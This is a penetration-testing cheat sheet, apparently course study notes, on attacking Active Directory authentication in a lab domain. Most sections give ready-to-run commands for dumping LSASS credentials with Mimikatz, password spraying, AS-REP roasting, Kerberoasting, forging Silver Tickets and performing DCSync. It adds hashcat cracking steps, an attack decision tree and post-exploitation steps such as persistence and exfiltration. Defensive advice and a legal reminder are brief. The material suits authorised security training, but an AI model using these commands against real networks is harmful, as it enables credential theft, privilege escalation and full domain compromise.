# Active Directory Authentication Attacks - Cheat Sheet

## Table of Contents
1. [Authentication Protocols Overview](#authentication-protocols-overview)
2. [Cached AD Credentials](#cached-ad-credentials)
3. [Password Attacks](#password-attacks)
4. [AS-REP Roasting](#as-rep-roasting)
5. [Kerberoasting](#kerberoasting)
6. [Silver Tickets](#silver-tickets)
7. [DCSync Attack](#dcsync-attack)

---

## Authentication Protocols Overview

### NTLM Authentication (7 Steps)
1. Client calculates NTLM hash from user password
2. Client sends username to server
3. Server returns nonce (challenge)
4. Client encrypts nonce with NTLM hash → response
5. Server forwards response + username + nonce to DC
6. DC encrypts nonce with stored NTLM hash
7. DC compares both encrypted values → authentication result

**Key Points:**
- Used when authenticating by IP address (not hostname)
- Fast hashing algorithm (vulnerable to cracking)
- 8-char passwords: ~2.5 hours to crack
- 9-char passwords: ~11 days to crack
- 600+ billion hashes/second with modern GPUs

### Kerberos Authentication
**Components:**
- **KDC**: Key Distribution Center (runs on DC)
- **TGT**: Ticket Granting Ticket
- **TGS**: Ticket Granting Service/Server
- **AS**: Authentication Server

**Authentication Flow:**
1. **AS-REQ**: User → DC (timestamp encrypted with user's password hash)
2. **AS-REP**: DC → User (session key + TGT)
3. **TGS-REQ**: User → DC (session key + TGT + resource name)
4. **TGS-REP**: DC → User (service ticket + session key)
5. **AP-REQ**: User → Application Server (service ticket + encrypted username)
6. Access granted based on group memberships in ticket

**Important Notes:**
- TGT valid for 10 hours by default
- TGT encrypted with krbtgt account NTLM hash
- Service ticket encrypted with service account password hash
- Stateless protocol

---

## Cached AD Credentials

### Storage Location
- **LSASS** (Local Security Authority Subsystem Service) memory space
- Requires SYSTEM or local admin privileges to access
- Data structures encrypted with LSASS-stored key

### Mimikatz - Credential Extraction

**Basic Commands:**
```powershell
# Start Mimikatz
.\mimikatz.exe

# Enable SeDebugPrivilege
privilege::debug

# Dump credentials
sekurlsa::logonpasswords

# List Kerberos tickets
sekurlsa::tickets
```

**Hash Types Retrieved:**
- **NTLM**: Available in all AD functional levels
- **SHA-1**: Available Windows Server 2008+
- **WDigest**: Cleartext passwords (Windows 7 or manually enabled)

### Defense: LSA Protection
- Registry key prevents reading LSASS memory
- Can be bypassed (covered in PEN-300)

### Certificate Services (AD CS)
**Exporting Non-Exportable Keys:**
```
# Patch CryptoAPI
crypto::capi

# Patch KeyIso service
crypto::cng
```

---

## Password Attacks

### Account Policy Reconnaissance
```powershell
net accounts
```

**Key Metrics:**
- **Lockout threshold**: Max failed attempts (e.g., 5)
- **Lockout duration**: How long account locked (e.g., 30 min)
- **Lockout observation window**: Reset period for failed attempts (e.g., 30 min)

**Safe Attack Rate:**
- With 5 threshold + 30 min window = 192 attempts/24hrs per user

### Password Spraying Methods

#### Method 1: LDAP/ADSI (Low and Slow)
```powershell
# Manual test
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "username", "password")

# Automated tool
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```

**Advantages:**
- Low network traffic
- Respects domain policies
- Stealthy

#### Method 2: SMB (Traditional)
```bash
# Create user list
cat users.txt
dave
jen
pete

# Spray password
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

**Disadvantages:**
- Very noisy (full SMB connections)
- Slow
- Doesn't check password policy

**Bonus Feature:**
- `(Pwn3d!)` indicates admin privileges on target

#### Method 3: Kerberos TGT (Most Efficient)
```powershell
# Windows
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

```bash
# Linux
kerbrute passwordspray -d corp.com usernames.txt "Nexus123!"
```

**Advantages:**
- Only 2 UDP frames per attempt
- Very fast
- Cross-platform

**Note:**
- If you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad's Save As functionality to change the encoding.

---

## AS-REP Roasting

### Theory
- Targets accounts with "Do not require Kerberos preauthentication" enabled
- Attacker requests AS-REP without preauthentication
- AS-REP contains encrypted data (with user's password hash)
- Offline password cracking possible

### Enumeration
```powershell
# Windows (PowerView)
Get-DomainUser -PreauthNotRequired
```

```bash
# Linux
impacket-GetNPUsers -dc-ip 192.168.50.70 corp.com/pete
```

### Attack Execution

#### From Linux (Impacket)
```bash
# Request AS-REP hash
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete

# Crack with Hashcat
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

#### From Windows (Rubeus)
```powershell
# Request AS-REP hash
.\Rubeus.exe asreproast /nowrap
```
Next, let's copy the AS-REP hash and paste it into a text file named hashes.asreproast2 in the home directory of user kali. We can now start Hashcat again to crack the AS-REP hash.
```
# Copy hash to Kali and crack
hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**Hashcat Mode:** `18200` (Kerberos 5, etype 23, AS-REP)

### Targeted AS-REP Roasting
If you have **GenericWrite** or **GenericAll** permissions:
1. Set "Do not require Kerberos preauthentication" on target user
2. Perform AS-REP Roasting
3. Remove the setting after obtaining hash

---

## Kerberoasting

### Theory
- Target: SPNs (Service Principal Names) with domain user accounts
- Service tickets encrypted with SPN's password hash
- No permission checks when requesting service ticket
- Offline cracking of service ticket possible

**Best Targets:**
- SPNs running under user accounts (not computer/managed service accounts)
- Computer accounts have 120-char random passwords (infeasible to crack)

### Attack Execution

#### From Windows (Rubeus)
```powershell
# Request TGS-REP hash
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

# Crack on Kali
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

#### From Linux (Impacket)
```bash
# Request TGS-REP hash
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete

# Save hash and crack
hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**Hashcat Mode:** `13100` (Kerberos 5, etype 23, TGS-REP)

**Note:** Synchronize time with DC if you get "KRB_AP_ERR_SKEW" error:
```bash
ntpdate <DC_IP>
# or
rdate <DC_IP>
```

### Targeted Kerberoasting
If you have **GenericWrite** or **GenericAll** permissions:
1. Set an SPN for target user account
2. Perform Kerberoasting
3. Remove SPN after obtaining hash

---

## Silver Tickets

### Theory
- Forge service tickets without contacting DC
- Application trusts service ticket (encrypted with SPN password hash)
- **PAC validation** rarely performed (would verify with DC)
- Can set arbitrary permissions in forged ticket

### Requirements
1. **SPN password hash** (NTLM hash)
2. **Domain SID**
3. **Target SPN**

### Attack Execution

#### Step 1: Gather SPN Password Hash
```powershell
# Using Mimikatz on compromised machine where SPN has session
privilege::debug
sekurlsa::logonpasswords
```

#### Step 2: Get Domain SID
```powershell
whoami /user
# Example output: S-1-5-21-1987370270-658905905-1781884369-1105
# Domain SID: S-1-5-21-1987370270-658905905-1781884369 (remove RID)
```

#### Step 3: Forge Silver Ticket
```powershell
# Mimikatz command
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

# Verify ticket injection
klist

# Test access
iwr -UseDefaultCredentials http://web04
```

**Parameters Explained:**
- `/sid:` - Domain SID
- `/domain:` - Domain name
- `/ptt` - Pass the ticket (inject into memory)
- `/target:` - Target server FQDN
- `/service:` - SPN protocol (http, cifs, ldap, etc.)
- `/rc4:` - NTLM hash of SPN
- `/user:` - Domain user to impersonate (can be any)

**Forged Ticket Includes:**
- User: jeffadmin
- Groups: Domain Admins (512), Administrators (500, 544), etc.
- Valid for 10 years

### Limitations
- **PAC_REQUESTOR** field (October 2022 patch) validates with DC
- Can't create tickets for non-existent users (same domain only)

---

## DCSync Attack

### Theory
- **DRS Remote Protocol**: Directory Replication Service
- DC doesn't verify request source, only SID privileges
- Impersonate DC to request credential replication
- Retrieve any user's credentials via `IDL_DRSGetNCChanges` API

### Required Rights
- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered Set

**Default Members:**
- Domain Admins
- Enterprise Admins
- Administrators

### Attack Execution

#### From Windows (Mimikatz)
```powershell
# Target specific user
lsadump::dcsync /user:corp\dave

# Target domain administrator
lsadump::dcsync /user:corp\Administrator

# Target krbtgt account
lsadump::dcsync /user:corp\krbtgt
```

**Output includes:**
- NTLM hash
- LM hash
- Kerberos keys (AES256, AES128, DES)

#### From Linux (Impacket)
```bash
# DCSync attack
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

# All domain credentials
impacket-secretsdump corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

### Crack Retrieved Hash
```bash
# Save NTLM hash to file
echo "08d7a47a6f9f66b97b1bae4178747494" > hashes.dcsync

# Crack with Hashcat
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

**Hashcat Mode:** `1000` (NTLM)

---

## Quick Reference Tables

### Hashcat Modes
| Attack Type | Mode | Hash Type |
|------------|------|-----------|
| NTLM | 1000 | NTLM hash |
| AS-REP Roasting | 18200 | Kerberos 5 AS-REP |
| Kerberoasting | 13100 | Kerberos 5 TGS-REP |

### Tool Comparison Matrix

| Tool | Platform | Password Spray | AS-REP | Kerberoast | DCSync |
|------|----------|----------------|---------|------------|---------|
| **Mimikatz** | Windows | ❌ | ❌ | ❌ | ✅ |
| **Rubeus** | Windows | ❌ | ✅ | ✅ | ❌ |
| **Spray-Passwords.ps1** | Windows | ✅ | ❌ | ❌ | ❌ |
| **kerbrute** | Both | ✅ | ❌ | ❌ | ❌ |
| **crackmapexec** | Linux | ✅ | ❌ | ❌ | ❌ |
| **impacket-GetNPUsers** | Linux | ❌ | ✅ | ❌ | ❌ |
| **impacket-GetUserSPNs** | Linux | ❌ | ❌ | ✅ | ❌ |
| **impacket-secretsdump** | Linux | ❌ | ❌ | ❌ | ✅ |

### Attack Prerequisites

| Attack | Required Access | Target | Output |
|--------|----------------|--------|--------|
| **Password Spray** | None (or low-priv user) | Domain users | Valid credentials |
| **AS-REP Roasting** | Domain user credentials | Users with "no preauth" | AS-REP hash |
| **Kerberoasting** | Domain user credentials | SPNs | TGS-REP hash |
| **Silver Ticket** | SPN password hash | Specific service | Forged service ticket |
| **DCSync** | Domain/Enterprise Admin | Any domain user | NTLM hash + Kerberos keys |

### Common Service SPNs

| Service | SPN Example | Protocol |
|---------|------------|----------|
| **IIS Web** | HTTP/web04.corp.com:80 | http |
| **SMB Share** | cifs/file01.corp.com | cifs |
| **LDAP** | LDAP/dc1.corp.com | ldap |
| **MSSQL** | MSSQLSvc/sql01.corp.com:1433 | MSSQLSvc |
| **RDP** | TERMSRV/server.corp.com | TERMSRV |

---

## Attack Decision Tree

```
Start: Domain Enumeration Complete
│
├─ Have domain user credentials?
│  ├─ NO → Password Spray Attack
│  │       └─ Success → Continue below
│  │
│  └─ YES → Check for vulnerabilities
│           │
│           ├─ Users with "no preauth" enabled?
│           │  └─ YES → AS-REP Roasting
│           │
│           ├─ SPNs registered to user accounts?
│           │  └─ YES → Kerberoasting
│           │
│           ├─ Have SPN password hash?
│           │  └─ YES → Silver Ticket
│           │
│           └─ Have Domain Admin access?
│              └─ YES → DCSync Attack
│
└─ Crack obtained hashes → Escalate privileges → Repeat
```

---

## Key Security Considerations

### For Attackers
1. **Account Lockout**: Always check policy before spraying
2. **Noise Level**: LDAP/Kerberos attacks quieter than SMB
3. **Time Sync**: Essential for Kerberos attacks
4. **Encoding**: Ensure proper file encoding (ANSI) for tools
5. **Cleanup**: Remove changes (SPNs, account settings) after targeted attacks

### For Defenders
1. **Enable LSA Protection**: Prevents Mimikatz credential dumping
2. **PAC Validation**: Enable for service accounts
3. **Strong Service Account Passwords**: 25+ characters, complex
4. **Disable Weak Protocols**: WDigest cleartext storage
5. **Monitor for**:
   - AS-REQ without preauth
   - Unusual TGS-REQ patterns
   - Replication requests from non-DC systems
   - Multiple failed authentications
6. **Managed Service Accounts**: Use gMSA for services (120-char random passwords)
7. **Least Privilege**: Minimize Domain Admin membership

---

## Common Errors & Solutions

| Error | Cause | Solution |
|-------|-------|----------|
| KRB_AP_ERR_SKEW | Clock skew with DC | Sync time: `ntpdate <DC_IP>` |
| Network error (kerbrute) | File encoding issue | Save file as ANSI |
| Hashcat "Not enough memory" | Insufficient RAM | Add more RAM to VM (4GB min) |
| "Access denied" with ticket | Ticket not injected | Use `/ptt` flag in Mimikatz |
| Empty AS-REP result | No vulnerable users | All users have preauth enabled |

---

## Post-Exploitation Next Steps

After successful attacks:

1. **Credential Validation**: Test on multiple systems
2. **Privilege Mapping**: Determine admin access scope
3. **Lateral Movement**: Use credentials on other systems
4. **Persistence**: Establish multiple access methods
5. **Golden Ticket**: Ultimate goal (requires krbtgt hash)
6. **Data Exfiltration**: Access sensitive resources

---

## Legal & Ethical Reminders

⚠️ **CRITICAL**: Only perform these attacks:
- On systems you own
- With explicit written authorization
- Within scope of engagement
- Following rules of engagement
- In controlled lab environments for learning

Unauthorized access is illegal and unethical.

---

## Additional Resources

- **Mimikatz**: https://github.com/gentilkiwi/mimikatz
- **Rubeus**: https://github.com/GhostPack/Rubeus
- **Impacket**: https://github.com/SecureAuthCorp/impacket
- **PowerView**: https://github.com/PowerShellMafia/PowerSploit
- **CrackMapExec**: https://github.com/byt3bl33d3r/CrackMapExec
- **Kerbrute**: https://github.com/ropnop/kerbrute

---

## Summary

This cheat sheet covers the core Active Directory authentication attacks:

1. **Understanding**: NTLM vs Kerberos authentication mechanisms
2. **Password Attacks**: Three methods of password spraying
3. **AS-REP Roasting**: Exploit missing Kerberos preauth
4. **Kerberoasting**: Crack service account passwords via TGS
5. **Silver Tickets**: Forge service tickets with SPN hashes
6. **DCSync**: Impersonate DC to retrieve all credentials
